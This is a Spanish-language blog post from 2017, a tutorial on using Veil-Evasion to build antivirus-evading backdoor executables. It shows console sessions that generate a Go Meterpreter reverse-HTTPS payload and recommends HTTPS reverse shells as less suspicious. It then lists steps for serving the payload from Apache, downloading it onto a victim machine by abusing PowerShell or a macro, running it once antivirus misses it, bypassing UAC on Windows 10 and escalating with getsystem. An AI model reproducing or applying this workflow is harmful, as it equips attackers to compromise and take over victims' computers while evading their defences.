---
layout: post
title: 'Veil-Evasion: Como crear payloads indetectables'
date: '2017-07-29 04:25:34'
tags:
- metasploit
- kali
- powershell
- evasion
---

Una de las cosas mas discutidas es como crear un payload indetectable a los AV's o como hacer un ejecutable con un backdoor sin que suene una alarma?

Hay muchos metodos para hacer un payload totalmente indetectable pero Veil-Evasion nos ayuda mucho en este caso.

![Veil 3 logo](https://camo.githubusercontent.com/4d1e7e864f6be9fb19d0be7eff8b28c9b522e62d/68747470733a2f2f7777772e7665696c2d6672616d65776f726b2e636f6d2f77702d636f6e74656e742f75706c6f6164732f323031332f31322f63726f707065642d5665696c2d53796d626f6c322e706e67)
## Que es [Veil-Evasion](https://github.com/Veil-Framework/Veil)?
Es una plataforma que nos ayuda a crear payloads y backdoors que sean difícilmente detectables en el sistema ajeno. Esto nos ayuda a pasar alarmas IDS/IPS y también muchos antivirus.

Es importante destacar que a veces algunos Anti-Virus basados en heuristicas, sandboxing y demas, tienden a detectar la amenaza, es por eso que debemos primero conocer el sistema del objetivo. Incluso a veces con un simple mapeo de red podemos reconocer dispositivos que nos dicen que sistema de AV se usa en la organización.

## Uso

No cubrire la instalación aquí ya que (al menos para mí) es un dolor de cabeza. Pero en Kali es bastante simple: `apt install veil-evasion` y listo.

```
=========================================================================
 Veil-Evasion | [Version]: 2.28.2
=========================================================================
 [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
=========================================================================

 Main Menu

        51 payloads loaded

 Available Commands:

        use             Use a specific payload
        info            Information on a specific payload
        list            List available payloads
        update          Update Veil-Evasion to the latest version
        clean           Clean out payload folders
        checkvt         Check payload hashes vs. VirusTotal
        exit            Exit Veil-Evasion

 [menu>>]:
```

Al ejecutar `veil-evasion` podemos ver las opciones que son bastante simples:
* `use`: Para usar un payload de la lista.
* `info`: Obtener mas información de un payload.
* `list`: Lista de payloads
* `update`: Actualizar Veil-Evasion
* `clean`: Limpiar/remover payloads, ejecutables, codigo, shellcodes en el sistema.
* `checkvt`: Para confirmar los hashes en VirusTotal, **es importante hacer esto.**

Uno de mis favoritos y que considero yo que causan menos alertas son `powershell/meterpreter/rev_https` y `go/meterpreter/rev_https` ya que por supuesto una conexión https levanta menos sospechas que un TCP en el puerto mas sospechoso posible.

Una vez que tengamos el payload de la lista que querramos utilizar pues lo ejecutamos:
`use go/meterpreter/rev_https`
```
Payload: go/meterpreter/rev_https loaded


 Required Options:

 Name                   Current Value   Description
 ----                   -------------   -----------
 COMPILE_TO_EXE         Y               Compile to an executable
 LHOST                                  IP of the Metasploit handler
 LPORT                  8443            Port of the Metasploit handler

 Available Commands:

        set             Set a specific option value
        info            Show information about the payload
        options         Show payload's options
        generate        Generate payload
        back            Go to the main menu
        exit            exit Veil-Evasion

 [go/meterpreter/rev_https>>]:
```

Configuramos nuestro **L**ocal **Host**:
```
[go/meterpreter/rev_https>>]: set LHOST 0.0.0.0
 [i] LHOST => 0.0.0.0
```

Y procedemos a generarlo aceptando los valores por defecto:
```
[go/meterpreter/rev_https>>]: generate

 [>] Please enter the base name for output files (default is 'payload'):
 
encoding/base64
sort
encoding/pem
internal/singleflight
net
-- SNIP --
 
[*] Executable written to: /var/lib/veil-evasion/output/compiled/payload1.exe

 Language:              Go
 Payload:               go/meterpreter/rev_https
 Required Options:      COMPILE_TO_EXE=Y  LHOST=0.0.0.0  LPORT=8443
 Payload File:          /var/lib/veil-evasion/output/source/payload1.go
 Handler File:          /var/lib/veil-evasion/output/handlers/payload1_handler.rc

 [*] Your payload files have been generated, don't get caught!
 [!] And don't submit samples to any online scanner! ;)

 [>] Press any key to return to the main menu.
```

Y listo, nuestro payload ya fue escrito en `/var/lib/veil-evasion/output/compiled/payload1.exe` para que podamos probarlo y llevarlo de la manera mas conveniente a nuestro objetivo.

Una de las maneras mas convenientes para hacer esto es hacer un servidor web y descargar el archivo en la máquina víctima abusando de powershell o un macro.

Aquí te demuestro con un ejemplo. Pasos realizados:
1. Generacion de payload con Veil
2. Empujar el payload en un zip en el directorio de apache e iniciar el servicio
3. Descargar el archivo zip en la máquina objectivo y descomprirlo.
4. Iniciar metasploit con el recurso que nos dio Veil: `/var/lib/veil-evasion/output/handlers/payload1_handler.rc`
5. Una vez que el AV no detecta el archivo maligno, proceder a ejecutarlo.
6. Una vez conectado el payload a metasploit proceder a post-explotar la maquina con un bypassuac para Windows 10
7. ejecutar getsystem en meterpreter

[![veilexe](/content/images/2017/07/veilexe.png)](https://getroot.info/rec/veil.html)
